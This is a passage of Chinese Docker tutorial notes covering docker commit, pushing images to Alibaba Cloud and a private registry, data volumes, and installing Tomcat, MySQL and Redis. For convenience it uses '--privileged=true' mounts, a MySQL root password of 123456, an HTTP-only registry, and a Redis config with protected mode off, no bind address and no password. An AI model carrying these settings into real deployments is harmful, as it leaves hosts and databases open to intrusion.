这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。\n所有对容器的改动 - 无论添加、删除、还是修改文件都只会发生在容器层中。只有容器层是可写的，容器层下面的所有镜像层都是只读的。\n\n4.3 Docker镜像commit操作案例\ndocker commit 提交容器副本使之成为一个新的镜像\ndocker commit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器ID 要创建的目标镜像名:[标签名]\n4.3.1 案例演示ubuntu安装vim\n\n从Hub上下载ubuntu镜像到本地并成功运行\n原始的默认Ubuntu镜像是不带着vim命令的\n\n\n\n外网连通的情况下，安装vim\n\n\ndocker容器内执行上述两条命令：\napt-get updateapt-get -y install vim\n\n\n\n安装完成后，commit我们自己的新镜像\n\n\n\n\n启动我们的新镜像并和原来的对比\n\n\n\n\n\n官网是默认下载的Ubuntu没有vim命令\n我们自己commit构建的镜像，新增加了vim功能，可以成功使用。\n\n\n\n4.3.2 小总结\nDocker中的镜像分层，支持通过扩展现有镜像，创建新的镜像。类似Java继承于一个Base基础类，自己再按需扩展。\n新镜像是从 base 镜像一层一层叠加生成的。每安装一个软件，就在现有镜像的基础上增加一层\n\n5 本地镜像发布到阿里云\n5.1 本地镜像发布到阿里云流程\n\n5.2 镜像的生成方法\n基于当前容器创建一个新的镜像，新功能增强 docker commit [OPTIONS] 容器ID [REPOSITORY[:TAG]]\nOPTIONS说明：\n-a :提交的镜像作者；\n-m :提交时的说明文字；\n\n\n5.3 将本地镜像推送到阿里云\n本地镜像素材原型\n\n\n阿里云开发者平台\nhttps://promotion.aliyun.com/ntms/act/kubernetes.html\n\n5.3.1 创建仓库镜像\n\n选择控制台，进入容器镜像服务\n\n\n\n选择个人实例\n\n\n\n命名空间\n\n\n\n\n仓库名称\n\n\n\n\n\n进入管理界面获得脚本\n\n\n5.3.2 将镜像推送到阿里云\n\n管理界面脚本\n\n\n\n脚本实例\n\ndocker login --username=zzyybuy registry.cn-hangzhou.aliyuncs.comdocker tag cea1bb40441c registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1docker push registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1\n上面命令是阳哥自己本地的，你自己酌情处理，不要粘贴我的。\n\n5.4 将阿里云上的镜像下载到本地\n\ndocker pull registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1\n6 本地镜像发布到私有库\n\n6.1 是什么\n1 官方Docker Hub地址：https://hub.docker.com/，中国大陆访问太慢了且准备被阿里云取代的趋势，不太主流。\n2 Dockerhub、阿里云这样的公共镜像仓库可能不太方便，涉及机密的公司不可能提供镜像给公网，所以需要创建一个本地私人仓库供给团队使用，基于公司内部项目构建镜像。\nDocker Registry是官方提供的工具，可以用于构建私有镜像仓库\n6.2 将本地镜像推送到私有库\n6.2.1 下载镜像Docker Registry\ndocker pull registry \n\n\n6.2.2 运行私有库Registry，相当于本地有个私有Docker hub\ndocker run -d -p 5000:5000  -v /zzyyuse/myregistry/:/tmp/registry --privileged=true registry\n默认情况，仓库被创建在容器的/var/lib/registry目录下，建议自行用容器卷映射，方便于宿主机联调\n\n6.2.3 案例演示创建一个新镜像，ubuntu安装ifconfig命令\n\n从Hub上下载ubuntu镜像到本地并成功运行\n原始的Ubuntu镜像是不带着ifconfig命令的\n\n\n\n外网连通的情况下，安装ifconfig命令并测试通过\n\ndocker容器内执行上述两条命令：\napt-get updateapt-get install net-tools\n\n\n\n安装完成后，commit我们自己的新镜像\n\n公式：\ndocker commit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器ID 要创建的目标镜像名:[标签名]\n命令：在容器外执行，记得\ndocker commit -m=&quot;ifconfig cmd add&quot; -a=&quot;zzyy&quot; a69d7c825c4f zzyyubuntu:1.2\n\n\n\n启动我们的新镜像并和原来的对比\n\n\n\n官网是默认下载的Ubuntu没有ifconfig命令。\n我们自己commit构建的新镜像，新增加了ifconfig功能，可以成功使用。\n\n\n\n\n6.2.4 curl验证私服库上有什么镜像\ncurl -XGET http://192.168.111.162:5000/v2/_catalog\n可以看到，目前私服库没有任何镜像上传过。\n\n6.2.5 将新镜像zzyyubuntu:1.2修改符合私服规范的Tag\n按照公式： docker   tag   镜像:Tag   Host:Port/Repository:Tag\n自己host主机IP地址，填写同学你们自己的，不要粘贴错误。\n使用命令 docker tag 将zzyyubuntu:1.2 这个镜像修改为192.168.111.162:5000/zzyyubuntu:1.2\ndocker tag  zzyyubuntu:1.2  192.168.111.162:5000/zzyyubuntu:1.2\n\n6.2.6 修改配置文件使之支持http\n\n别无脑照着复制，registry-mirrors 配置的是国内阿里提供的镜像加速地址，不用加速的话访问官网的会很慢。\n2个配置中间有个逗号 ','别漏了，这个配置是json格式的。\nvim命令新增如下红色内容：vim /etc/docker/daemon.json\n{\n“registry-mirrors”: [“https://aa25jngu.mirror.aliyuncs.com”],\n“insecure-registries”: [“192.168.111.162:5000”]\n}\n上述理由：docker默认不允许http方式推送镜像，通过配置选项来取消这个限制。====&gt; 修改完后如果不生效，建议重启docker。\n6.2.7 push推送到私服库\ndocker push 192.168.111.162:5000/zzyyubuntu:1.2\n\n6.2.8 curl验证私服库上有什么镜像2\ncurl -XGET http://192.168.111.162:5000/v2/_catalog\n\n6.2.9 pull到本地并运行\ndocker pull 192.168.111.162:5000/zzyyubuntu:1.2\n\ndocker run -it 镜像ID /bin/bash\n\n7 Docker容器数据卷\n7.1 坑：容器卷记得加入\n--privileged=true\nDocker挂载主机目录访问如果出现cannot open directory .: Permission denied\n解决办法：在挂载目录后多加一个–privileged=true参数即可\n如果是CentOS7安全模块会比之前系统版本加强，不安全的会先禁止，所以目录挂载的情况被默认为不安全的行为，在SELinux里面挂载目录被禁止掉了，如果要开启，我们一般使用–privileged=true命令，扩大容器的权限解决挂载目录没有权限的问题，也即使用该参数，container内的root拥有真正的root权限，否则，container内的root只是外部的一个普通用户权限。\n7.2 回顾下上一讲的知识点，参数V\n\n7.3 是什么\n卷就是目录或文件，存在于一个或多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过Union File System提供一些用于持续存储或共享数据的特性：卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在容器删除时删除其挂载的数据卷。\n一句话：有点类似我们Redis里面的rdb和aof文件。\n将docker容器内的数据保存进宿主机的磁盘中，运行一个带有容器卷存储功能的容器实例。\ndocker run -it --privileged=true -v /宿主机绝对路径目录:/容器内目录 镜像名\n7.4 能干嘛\n将运用与运行的环境打包镜像，run后形成容器实例运行 ，但是我们对数据的要求希望是持久化的。\nDocker容器产生的数据，如果不备份，那么当容器实例删除后，容器内的数据自然也就没有了。为了能保存数据在docker中我们使用卷。\n特点：\n\n数据卷可在容器之间共享或重用数据\n卷中的更改可以直接实时生效，爽\n数据卷中的更改不会包含在镜像的更新中\n数据卷的生命周期一直持续到没有容器使用它为止\n\n7.5 数据卷案例\n7.5.1 宿主vs容器之间映射添加容器卷\n\n直接命令添加\n\ndocker run -it --privileged=true -v /宿主机绝对路径目录:/容器内目录 镜像名\n公式：docker run -it -v /宿主机目录:/容器内目录 ubuntu /bin/bash\ndocker run -it --name myu3 --privileged=true -v /tmp/myHostData:/tmp/myDockerData ubuntu /bin/bash\n\n\n查看数据卷是否挂载成功\n\ndocker inspect 容器ID\n\n\n\n容器和宿主机之间数据共享\n\n\n\ndocker修改，主机同步获得 。\n主机修改，docker同步获得。\ndocker容器stop，主机修改，docker容器重启看数据是否同步。\n\n\n\n\n7.5.2 读写规则映射添加说明\n读写(默认)\ndocker run -it --privileged=true -v /宿主机绝对路径目录:/容器内目录:rw 镜像名\n默认同上案例，默认就是rw\n\nrw = read + write\n\n只读\n容器实例内部被限制，只能读取不能写\n\n/容器目录:ro 镜像名               就能完成功能，此时容器自己只能读取不能写\nro = read only\n此时如果宿主机写入内容，可以同步给容器内，容器可以读取到。\ndocker run -it --privileged=true -v /宿主机绝对路径目录:/容器内目录:ro 镜像名\n7.5.3 卷的继承和共享\n容器1完成和宿主机的映射\ndocker run -it  --privileged=true -v /mydocker/u:/tmp --name u1 ubuntu\n\n\n容器2继承容器1的卷规则\ndocker run -it  --privileged=true --volumes-from 父类  --name u2 ubuntu\n\n8 Docker常规安装简介\n8.1 总体步骤\n\n搜索镜像\n拉取镜像\n查看镜像\n启动镜像 - 服务端口映射\n停止容器\n移除容器\n\n8.2 安装tomcat\n\ndocker hub上面查找tomcat镜像\n\ndocker search tomcat\n\n\n从docker hub上拉取tomcat镜像到本地\n\ndocker pull tomcat\n\n\n\ndocker images查看是否有拉取到的tomcat\n\n\n\n使用tomcat镜像创建容器实例(也叫运行镜像)\n\ndocker run -it -p 8080:8080 tomcat\n-p 小写，主机端口:docker容器端口\n-P 大写，随机分配端口\n-i 交互\n-t 终端\n-d 后台\n\n\n访问猫首页\n\n问题\n\n解决\n\n\n\n可能没有映射端口或者没有关闭防火墙\n把webapps.dist目录换成webapps\n\n\n\n先成功启动tomcat\n\n查看webapps 文件夹查看为空\n\n\n免修改版说明\n\ndocker pull billygoo/tomcat8-jdk8docker run -d -p 8080:8080 --name mytomcat8 billygoo/tomcat8-jdk8\n\n8.3 安装mysql\n8.3.1 docker hub上面查找mysql镜像\n\n8.3.2 从docker hub上(阿里云加速器)拉取mysql镜像到本地标签为5.7\n\n8.3.3 使用mysql5.7镜像创建容器(也叫运行镜像)\n8.3.3.1 命令出处，哪里来的？\n\n8.3.3.2 简单版\n使用mysql镜像\ndocker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7docker psdocker exec -it 容器ID /bin/bashmysql -uroot -p\n\n建库建表插入数据\n\n外部Win10也来连接运行在dokcer上的mysql容器实例服务\n\n问题\n插入中文数据试试\n\n为什么报错?\ndocker上默认字符集编码隐患,docker里面的mysql容器实例查看，内容如下：\nSHOW VARIABLES LIKE &#x27;character%&#x27;\n\n删除容器后，里面的mysql数据怎么办？\n8.3.3.3 实战版\n新建mysql容器实例\ndocker run -d -p 3306:3306 --privileged=true -v /bcxuse/mysql/log:/var/log/mysql -v /bcxuse/mysql/data:/var/lib/mysql -v /bcxuse/mysql/conf:/etc/mysql/conf.d -eMYSQL_ROOT_PASSWORD=123456  --name mysql mysql:5.7\n\n新建my.cnf，通过容器卷同步给mysql容器实例\n[client]default_character_set=utf8[mysqld]collation_server = utf8_general_cicharacter_set_server = utf8\n\n重新启动mysql容器实例再重新进入并查看字符编码\n\n\n再新建库新建表再插入中文测试\n\n\n结论\n之前的DB  无效，修改字符集操作+重启mysql容器实例\n之后的DB  有效，需要新建\n结论：docker安装完MySQL并run出容器后，建议请先修改完字符集编码后再新建mysql库-表-插数据\n\n假如将当前容器实例删除，再重新来一次，之前建的db01实例还有吗？try\n8.4 安装redis\n\n从docker hub上(阿里云加速器)拉取redis镜像到本地标签为6.0.8\n\n\n\n入门命令\n\n\n\n命令提醒：容器卷记得加入–privileged=true\n\nDocker挂载主机目录Docker访问出现cannot open directory .: Permission denied\n解决办法：在挂载目录后多加一个–privileged=true参数即可\n\n在CentOS宿主机下新建目录/app/redis\n\nmkdir -p /app/redis\n\n\n将一个redis.conf文件模板拷贝进/app/redis目录下\n\n\n将准备好的redis.conf文件放进/app/redis目录下\n\n/app/redis目录下修改redis.conf文件\n\n默认出厂的原始redis.conf\n# Redis configuration file example.## Note that in order to read the configuration file, Redis must be# started with the file path as first argument:## ./redis-server /path/to/redis.conf # Note on units: when memory size is needed, it is possible to specify# it in the usual form of 1k 5GB 4M and so forth:## 1k =&gt; 1000 bytes# 1kb =&gt; 1024 bytes# 1m =&gt; 1000000 bytes# 1mb =&gt; 1024*1024 bytes# 1g =&gt; 1000000000 bytes# 1gb =&gt; 1024*1024*1024 bytes## units are case insensitive so 1GB 1Gb 1gB are all the same. ################################## INCLUDES ################################### # Include one or more other config files here.  This is useful if you# have a standard template that goes to all Redis servers but also need# to customize a few per-server settings.  Include files can include# other files, so use this wisely.## Notice option &quot;include&quot; won&#x27;t be rewritten by command &quot;CONFIG REWRITE&quot;# from admin or Redis Sentinel. Since Redis always uses the last processed# line as value of a configuration directive, you&#x27;d better put includes# at the beginning of this file to avoid overwriting config change at runtime.## If instead you are interested in using includes to override configuration# options, it is better to use include as the last line.## include /path/to/local.conf# include /path/to/other.conf ################################## MODULES ##################################### # Load modules at startup. If the server is not able to load modules# it will abort. It is possible to use multiple loadmodule directives.## loadmodule /path/to/my_module.so# loadmodule /path/to/other_module.so ################################## NETWORK ##################################### # By default, if no &quot;bind&quot; configuration directive is specified, Redis listens# for connections from all the network interfaces available on the server.# It is possible to listen to just one or multiple selected interfaces using# the &quot;bind&quot; configuration directive, followed by one or more IP addresses.## Examples:## bind 192.168.1.100 10.0.0.1# bind 127.0.0.1 ::1## ~~~ WARNING ~~~ If the computer running Redis is directly exposed to the# internet, binding to all the interfaces is dangerous and will expose the# instance to everybody on the internet. So by default we uncomment the# following bind directive, that will force Redis to listen only into# the IPv4 loopback interface address (this means Redis will be able to# accept connections only from clients running into the same computer it# is running).## IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES# JUST COMMENT THE FOLLOWING LINE.# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#bind 127.0.0.1 # Protected mode is a layer of security protection, in order to avoid that# Redis instances left open on the internet are accessed and exploited.## When protected mode is on and if:## 1) The server is not binding explicitly to a set of addresses using the#    &quot;bind&quot; directive.# 2) No password is configured.## The server only accepts connections from clients connecting from the# IPv4 and IPv6 loopback addresses 127.0.0.1 and ::1, and from Unix domain# sockets.## By default protected mode is enabled. You should disable it only if# you are sure you want clients from other hosts to connect to Redis# even if no authentication is configured, nor a specific set of interfaces# are explicitly listed using the &quot;bind&quot; directive.protected-mode no # Accept connections on the specified port, default is 6379 (IANA #815344).# If port 0 is specified Redis will not listen on a TCP socket.port 6379 # TCP listen() backlog.## In high requests-per-second environments you need an high backlog in order# to avoid slow clients connections issues. Note that the Linux kernel# will silently truncate it to the value of /proc/sys/net/core/somaxconn so# make sure to raise both the value of somaxconn and tcp_max_syn_backlog# in order to get the desired effect.tcp-backlog 511 # Unix socket.## Specify the path for the Unix socket that will be used to listen for# incoming connections. There is no default, so Redis will not listen# on a unix socket when not specified.## unixsocket /tmp/redis.sock# unixsocketperm 700 # Close the connection after a client is idle for N seconds (0 to disable)timeout 0 # TCP keepalive.## If non-zero, use SO_KEEPALIVE to send TCP ACKs to clients in absence# of communication. This is useful for two reasons:## 1) Detect dead peers.# 2) Take the connection alive from the point of view of network#    equipment in the middle.## On Linux, the specified value (in seconds) is the period used to send ACKs.# Note that to close the connection the double of the time is needed.# On other kernels the period depends on the kernel configuration.## A reasonable value for this option is 300 seconds, which is the new# Redis default starting with Redis 3.2.1.tcp-keepalive 300 ################################# GENERAL ##################################### # By default Redis does not run as a daemon. Use &#x27;yes&#x27; if you need it.# Note that Redis will write a pid file in /var/run/redis.pid when daemonized.daemonize no # If you run Redis from upstart or systemd, Redis can interact with your# supervision tree. Options:#   supervised no      - no supervision interaction#   supervised upstart - signal upstart by putting Redis into SIGSTOP mode#   supervised systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET#   supervised auto    - detect upstart or systemd method based on#                        UPSTART_JOB or NOTIFY_SOCKET environment variables# Note: these supervision methods only signal &quot;process is ready.&quot;#       They do not enable continuous liveness pings back to your supervisor.supervised no # If a pid file is specified, Redis writes it where specified at startup# and removes it at exit.## When the server runs non daemonized, no pid file is created if none is# specified in the configuration. When the server is daemonized, the pid file# is used even if not specified, defaulting to &quot;/var/run/redis.pid&quot;.## Creating a pid file is best effort: if Redis is not able to create it# nothing bad happens, the server will start and run normally.pidfile /var/run/redis_6379.pid # Specify the server verbosity level.# This can be one of:# debug (a lot of information, useful for development/testing)# verbose (many rarely useful info, but not a mess like the debug level)# notice (moderately verbose, what you want in production probably)# warning (only very important / critical messages are logged)loglevel notice # Specify the log file name. Also the empty string can be used to force# Redis to log on the standard output. Note that if you use standard# output for logging but daemonize, logs will be sent to /dev/nulllogfile &quot;&quot; # To enable logging to the system logger, just set &#x27;syslog-enabled&#x27; to yes,# and optionally update the other syslog parameters to suit your needs.# syslog-enabled no # Specify the syslog identity.# syslog-ident redis # Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7.# syslog-facility local0 # Set the number of databases. The default database is DB 0, you can select# a different one on a per-connection basis using SELECT &lt;dbid&gt; where# dbid is a number between 0 and &#x27;databases&#x27;-1databases 16 # By default Redis shows an ASCII art logo only when started to log to the# standard output and if the standard output is a TTY. Basically this means# that normally a logo is displayed only in interactive sessions.## However it is possible to force the pre-4.0 behavior and always show a# ASCII art logo in startup logs by setting the following option to yes.always-show-logo yes ################################ SNAPSHOTTING  ################################## Save the DB on disk:##   save &lt;seconds&gt; &lt;changes&gt;##   Will save the DB if both the given number of seconds and the given#   number of write operations against the DB occurred.##   In the example below the behaviour will be to save:#   after 900 sec (15 min) if at least 1 key changed#   after 300 sec (5 min) if at least 10 keys changed#   after 60 sec if at least 10000 keys changed##   Note: you can disable saving completely by commenting out all &quot;save&quot; lines.##   It is also possible to remove all the previously configured save#   points by adding a save directive with a single empty string argument#   like in the following example:##   save &quot;&quot; save 900 1save 300 10save 60 10000 # By default Redis will stop accepting writes if RDB snapshots are enabled# (at least one save point) and the latest background save failed.# This will make the user aware (in a hard way) that data is not persisting# on disk properly, otherwise chances are that no one will notice and some# disaster will happen.## If the background saving process will start working again Redis will# automatically allow writes again.## However if you have setup your proper monitoring of the Redis server# and persistence, you may want to disable this feature so that Redis will# continue to work as usual even if there are problems with disk,# permissions, and so forth.stop-writes-on-bgsave-error yes # Compress string objects using LZF when dump .rdb databases?# For default that&#x27;s set to &#x27;yes&#x27; as it&#x27;s almost always a win.# If you want to save some CPU in the saving child set it to &#x27;no&#x27; but# the dataset will likely be bigger if you have compressible values or keys.rdbcompression yes # Since version 5 of RDB a CRC64 checksum is placed at the end of the file.# This makes the format more resistant to corruption but there is a performance# hit to pay (around 10%) when saving and loading RDB files, so you can disable it# for maximum performances.## RDB files created with checksum disabled have a checksum of zero that will# tell the loading code to skip the check.rdbchecksum yes # The filename where to dump the DBdbfilename dump.rdb # The working directory.## The DB will be written inside this directory, with the filename specified# above using the &#x27;dbfilename&#x27; configuration directive.## The Append Only File will also be created inside this directory.## Note that you must specify a directory here, not a file name.dir ./ ################################# REPLICATION ################################# # Master-Replica replication. Use replicaof to make a Redis instance a copy of# another Redis server. A few things to understand ASAP about Redis replication.##   +------------------+      +---------------+#   |      Master      | ---&gt; |    Replica    |#   | (receive writes) |      |  (exact copy) |#   +------------------+      +---------------+## 1) Redis replication is asynchronous, but you can configure a master to#    stop accepting writes if it appears to be not connected with at least#    a given number of replicas.# 2) Redis replicas are able to perform a partial resynchronization with the#    master if the replication link is lost for a relatively small amount of#    time. You may want to configure the replication backlog size (see the next#    sections of this file) with a sensible value depending on your needs.# 3) Replication is automatic and does not need user intervention. After a#    network partition replicas automatically try to reconnect to masters#    and resynchronize with them.## replicaof &lt;masterip&gt; &lt;masterport&gt; # If the master is password protected (using the &quot;requirepass&quot; configuration# directive below) it is possible to tell the replica to authenticate before# starting the replication synchronization process, otherwise the master will# refuse the replica request.## masterauth &lt;master-password&gt; # When a replica loses its connection with the master, or when the replication# is still in progress, the replica can act in two different ways:## 1) if replica-serve-stale-data is set to &#x27;yes&#x27; (the default) the replica will#    still reply to client requests, possibly with out of date data, or the#    data set may just be empty if this is the first synchronization.## 2) if replica-serve-stale-data is set to &#x27;no&#x27; the replica will reply with#    an error &quot;SYNC with master in progress&quot; to all the kind of commands#    but to INFO, replicaOF, AUTH, PING, SHUTDOWN, REPLCONF, ROLE, CONFIG,#    SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB,#    COMMAND, POST, HOST: and LATENCY.#replica-serve-stale-data yes # You can configure a replica instance to accept writes or not. Writing against# a replica instance may be useful to store some ephemeral data (because data# written on a replica will be easily deleted after resync with the master) but# may also cause problems if clients are writing to it because of a# misconfiguration.## Since Redis 2.6 by default replicas are read-only.## Note: read only replicas are not designed to be exposed to untrusted clients# on the internet. It&#x27;s just a protection layer against misuse of the instance.# Still a read only replica exports by default all the administrative commands# such as CONFIG, DEBUG, and so forth. To a limited extent you can improve# security of read only replicas using &#x27;rename-command&#x27; to shadow all the# administrative / dangerous commands.replica-read-only yes # Replication SYNC strategy: disk or socket.## -------------------------------------------------------# WARNING: DISKLESS REPLICATION IS EXPERIMENTAL CURRENTLY# -------------------------------------------------------## New replicas and reconnecting replicas that are not able to continue the replication# process just receiving differences, need to do what is called a &quot;full# synchronization&quot;. An RDB file is transmitted from the master to the replicas.# The transmission can happen in two different ways:## 1) Disk-backed: The Redis master creates a new process that writes the RDB#                 file on disk. Later the file is transferred by the parent#                 process to the replicas incrementally.# 2) Diskless: The Redis master creates a new process that directly writes the#              RDB file to replica sockets, without touching the disk at all.## With disk-backed replication, while the RDB file is generated, more replicas# can be queued and served with the RDB file as soon as the current child producing# the RDB file finishes its work. With diskless replication instead once# the transfer starts, new replicas arriving will be queued and a new transfer# will start when the current one terminates.## When diskless replication is used, the master waits a configurable amount of# time (in seconds) before starting the transfer in the hope that multiple replicas# will arrive and the transfer can be parallelized.## With slow disks and fast (large bandwidth) networks, diskless replication# works better.repl-diskless-sync no # When diskless replication is enabled, it is possible to configure the delay# the server waits in order to spawn the child that transfers the RDB via socket# to the replicas.## This is important since once the transfer starts, it is not possible to serve# new replicas arriving, that will be queued for the next RDB transfer, so the server# waits a delay in order to let more replicas arrive.## The delay is specified in seconds, and by default is 5 seconds. To disable# it entirely just set it to 0 seconds and the transfer will start ASAP.repl-diskless-sync-delay 5 # Replicas send PINGs to server in a predefined interval. It&#x27;s possible to change# this interval with the repl_ping_replica_period option. The default value is 10# seconds.## repl-ping-replica-period 10 # The following option sets the replication timeout for:## 1) Bulk transfer I/O during SYNC, from the point of view of replica.# 2) Master timeout from the point of view of replicas (data, pings).# 3) Replica timeout from the point of view of masters (REPLCONF ACK pings).## It is important to make sure that this value is greater than the value# specified for repl-ping-replica-period otherwise a timeout will be detected# every time there is low traffic between the master and the replica.## repl-timeout 60 # Disable TCP_NODELAY on the replica socket after SYNC?## If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and# less bandwidth to send data to replicas. But this can add a delay for# the data to appear on the replica side, up to 40 milliseconds with# Linux kernels using a default configuration.## If you select &quot;no&quot; the delay for data to appear on the replica side will# be reduced but more bandwidth will be used for replication.## By default we optimize for low latency, but in very high traffic conditions# or when the master and replicas are many hops away, turning this to &quot;yes&quot; may# be a good idea.repl-disable-tcp-nodelay no # Set the replication backlog size. The backlog is a buffer that accumulates# replica data when replicas are disconnected for some time, so that when a replica# wants to reconnect again, often a full resync is not needed, but a partial# resync is enough, just passing the portion of data the replica missed while# disconnected.## The bigger the replication backlog, the longer the time the replica can be# disconnected and later be able to perform a partial resynchronization.## The backlog is only allocated once there is at least a replica connected.## repl-backlog-size 1mb # After a master has no longer connected replicas for some time, the backlog# will be freed. The following option configures the amount of seconds that# need to elapse, starting from the time the last replica disconnected, for# the backlog buffer to be freed.## Note that replicas never free the backlog for timeout, since they may be# promoted to masters later, and should be able to correctly &quot;partially# resynchronize&quot; with the replicas: hence they should always accumulate backlog.## A value of 0 means to never release the backlog.## repl-backlog-ttl 3600 # The replica priority is an integer number published by Redis in the INFO output.# It is used by Redis Sentinel in order to select a replica to promote into a# master if the master is no longer working correctly.## A replica with a low priority number is considered better for promotion, so# for instance if there are three replicas with priority 10, 100, 25 Sentinel will# pick the one with priority 10, that is the lowest.## However a special priority of 0 marks the replica as not able to perform the# role of master, so a replica with priority of 0 will never be selected by# Redis Sentinel for promotion.## By default the priority is 100.replica-priority 100 # It is possible for a master to stop accepting writes if there are less than# N replicas connected, having a lag less or equal than M seconds.## The N replicas need to be in &quot;online&quot; state.## The lag in seconds, that must be &lt;= the specified value, is calculated from# the last ping received from the replica, that is usually sent every second.## This option does not GUARANTEE that N replicas will accept the write, but# will limit the window of exposure for lost writes in case not enough replicas# are available, to the specified number of seconds.## For example to require at least 3 replicas with a lag &lt;= 10 seconds use:## min-replicas-to-write 3# min-replicas-max-lag 10## Setting one or the other to 0 disables the feature.## By default min-replicas-to-write is set to 0 (feature disabled) and# min-replicas-max-lag is set to 10. # A Redis master is able to list the address and port of the attached# replicas in different ways. For example the &quot;INFO replication&quot; section# offers this information, which is used, among other tools, by# Redis Sentinel in order to discover replica instances.# Another place where this info is available is in the output of the# &quot;ROLE&quot; command of a master.## The listed IP and address normally reported by a replica is obtained# in the following way:##   IP: The address is auto detected by checking the peer address#   of the socket used by the replica to connect with the master.##   Port: The port is communicated by the replica during the replication#   handshake, and is normally the port that the replica is using to#   listen for connections.## However when port forwarding or Network Address Translation (NAT) is# used, the replica may be actually reachable via different IP and port# pairs. The following two options can be used by a replica in order to# report to its master a specific set of IP and port, so that both INFO# and ROLE will report those values.## There is no need to use both the options if you need to override just# the port or the IP address.## replica-announce-ip 5.5.5.5# replica-announce-port 1234 ################################## SECURITY ################################### # Require clients to issue AUTH &lt;PASSWORD&gt; before processing any other# commands.  This might be useful in environments in which you do not trust# others with access to the host running redis-server.## This should stay commented out for backward compatibility and because most# people do not need auth (e.g. they run their own servers).## Warning: since Redis is pretty fast an outside user can try up to# 150k passwords per second against a good box. This means that you should# use a very strong password otherwise it will be very easy to break.## requirepass foobared # Command renaming.## It is possible to change the name of dangerous commands in a shared# environment. For instance the CONFIG command may be renamed into something# hard to guess so that it will still be available for internal-use tools# but not available for general clients.## Example:## rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52## It is also possible to completely kill a command by renaming it into# an empty string:## rename-command CONFIG &quot;&quot;## Please note that changing the name of commands that are logged into the# AOF file or transmitted to replicas may cause problems. ################################### CLIENTS #################################### # Set the max number of connected clients at the same time. By default# this limit is set to 10000 clients, however if the Redis server is not# able to configure the process file limit to allow for the specified limit# the max number of allowed clients is set to the current file limit# minus 32 (as Redis reserves a few file descriptors for internal uses).## Once the limit is reached Redis will close all the new connections sending# an error &#x27;max number of clients reached&#x27;.## maxclients 10000 ############################## MEMORY MANAGEMENT ################################ # Set a memory usage limit to the specified amount of bytes.# When the memory limit is reached Redis will try to remove keys# according to the eviction policy selected (see maxmemory-policy).## If Redis can&#x27;t remove keys according to the policy, or if the policy is# set to &#x27;noeviction&#x27;, Redis will start to reply with errors to commands# that would use more memory, like SET, LPUSH, and so on, and will continue# to reply to read-only commands like GET.## This option is usually useful when using Redis as an LRU or LFU cache, or to# set a hard memory limit for an instance (using the &#x27;noeviction&#x27; policy).## WARNING: If you have replicas attached to an instance with maxmemory on,# the size of the output buffers needed to feed the replicas are subtracted# from the used memory count, so that network problems / resyncs will# not trigger a loop where keys are evicted, and in turn the output# buffer of replicas is full with DELs of keys evicted triggering the deletion# of more keys, and so forth until the database is completely emptied.## In short... if you have replicas attached it is suggested that you set a lower# limit for maxmemory so that there is some free RAM on the system for replica# output buffers (but this is not needed if the policy is &#x27;noeviction&#x27;).## maxmemory &lt;bytes&gt; # MAXMEMORY POLICY: how Redis will select what to remove when maxmemory# is reached. You can select among five behaviors:## volatile-lru -&gt; Evict using approximated LRU among the keys with an expire set.# allkeys-lru -&gt; Evict any key using approximated LRU.# volatile-lfu -&gt; Evict using approximated LFU among the keys with an expire set.# allkeys-lfu -&gt; Evict any key using approximated LFU.# volatile-random -&gt; Remove a random key among the ones with an expire set.# allkeys-random -&gt; Remove a random key, any key.# volatile-ttl -&gt; Remove the key with the nearest expire time (minor TTL)# noeviction -&gt; Don&#x27;t evict anything, just return an error on write operations.## LRU means Least Recently Used# LFU means Least Frequently Used## Both LRU, LFU and volatile-ttl are implemented using approximated# randomized algorithms.## Note: with any of the above policies, Redis will return an error on write#       operations, when there are no suitable keys for eviction.##       At the date of writing these commands are: set setnx setex append#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby#       getset mset msetnx exec sort## The default is:## maxmemory-policy noeviction # LRU, LFU and minimal TTL algorithms are not precise algorithms but approximated# algorithms (in order to save memory), so you can tune it for speed or# accuracy. For default Redis will check five keys and pick the one that was# used less recently, you can change the sample size using the following# configuration directive.## The default of 5 produces good enough results. 10 Approximates very closely# true LRU but costs more CPU. 3 is faster but not very accurate.## maxmemory-samples 5 # Starting from Redis 5, by default a replica will ignore its maxmemory setting# (unless it is promoted to master after a failover or manually). It means# that the eviction of keys will be just handled by the master, sending the# DEL commands to the replica as keys evict in the master side.## This behavior ensures that masters and replicas stay consistent, and is usually# what you want, however if your replica is writable, or you want the replica to have# a different memory setting, and you are sure all the writes performed to the# replica are idempotent, then you may change this default (but be sure to understand# what you are doing).## Note that since the replica by default does not evict, it may end using more# memory than the one set via maxmemory (there are certain buffers that may# be larger on the replica, or data structures may sometimes take more memory and so# forth). So make sure you monitor your replicas and make sure they have enough# memory to never hit a real out-of-memory condition before the master hits# the configured maxmemory setting.## replica-ignore-maxmemory yes ############################# LAZY FREEING #################################### # Redis has two primitives to delete keys. One is called DEL and is a blocking# deletion of the object. It means that the server stops processing new commands# in order to reclaim all the memory associated with an object in a synchronous# way. If the key deleted is associated with a small object, the time needed# in order to execute the DEL command is very small and comparable to most other# O(1) or O(log_N) commands in Redis. However if the key is associated with an# aggregated value containing millions of elements, the server can block for# a long time (even seconds) in order to complete the operation.## For the above reasons Redis also offers non blocking deletion primitives# such as UNLINK (non blocking DEL) and the ASYNC option of FLUSHALL and# FLUSHDB commands, in order to 